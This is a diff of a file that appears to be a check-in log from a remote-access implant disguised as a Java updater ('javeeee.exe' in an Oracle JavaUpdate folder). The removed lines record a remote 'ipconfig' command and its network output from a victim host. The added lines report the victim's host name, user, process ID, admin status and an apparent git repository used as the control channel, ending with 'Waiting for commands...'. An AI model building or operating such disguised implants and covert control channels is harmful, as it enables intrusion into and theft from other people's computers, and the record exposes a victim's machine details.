@@ -1,42 +1,13 @@
-2026-08-20T19:35:24.4917303
-
-DESKTOP-Q1B7661 / user
-
-C:\
-
-C:\Users\Bravo\AppData\Local\Oracle\JavaUpdate\javeeee.exe
-
-
-
-CMD[1/1] ipconfig
-
-Windows IP Configuration
-
-
-Wireless LAN adapter Local Area Connection* 1:
-
-   Media State . . . . . . . . . . . : Media disconnected
-   Connection-specific DNS Suffix  . : 
-
-Wireless LAN adapter Local Area Connection* 10:
-
-   Media State . . . . . . . . . . . : Media disconnected
-   Connection-specific DNS Suffix  . : 
-
-Wireless LAN adapter WiFi:
-
-   Connection-specific DNS Suffix  . : www.tendawifi.com
-   Link-local IPv6 Address . . . . . : fe80::d1fa:3efa:975b:243%16
-   IPv4 Address. . . . . . . . . . . : 192.168.0.104
-   Subnet Mask . . . . . . . . . . . : 255.255.255.0
-   Default Gateway . . . . . . . . . : 192.168.0.1
-
-Ethernet adapter Bluetooth Network Connection:
-
-   Media State . . . . . . . . . . . : Media disconnected
-   Connection-specific DNS Suffix  . : 
-
-Ethernet adapter Ethernet:
-
-   Media State . . . . . . . . . . . : Media disconnected
-   Connection-specific DNS Suffix  . : 
+Java Runtime Helper Online
+time=2026-08-20T23:09:36.2331596
+version=1.0.0
+host=DESKTOP-Q1B7661
+user=Bravo
+pid=20632
+path=C:\Users\Bravo\AppData\Local\Oracle\JavaUpdate\javeeee.exe
+admin=false
+ssl=winhttp
+folder=hosts/DESKTOP-Q1B7661_Bravo
+repo=duuniversity620/javadtin
+log=C:\Users\Bravo\AppData\Local\Temp\javeeee_debug.log
+Waiting for commands...
